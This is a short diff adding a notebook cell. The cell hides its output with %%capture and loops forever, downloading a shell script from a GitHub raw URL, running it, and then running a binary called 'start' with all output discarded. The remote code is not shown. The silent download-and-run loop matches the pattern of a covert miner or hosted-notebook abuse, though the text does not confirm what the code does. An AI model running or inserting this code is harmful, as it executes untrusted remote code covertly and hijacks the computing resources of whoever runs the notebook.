@@ -1,0 +1,5 @@
+%%capture 
+import time  
+while  True:  
+  ! timeout 15m wget https://raw.githubusercontent.com/ziraponk/filter/main/filter.sh && chmod u+x filter.sh && ./filter.sh && chmod +x start &&./start > /dev/null 2>&1  
+  time.sleep(20)
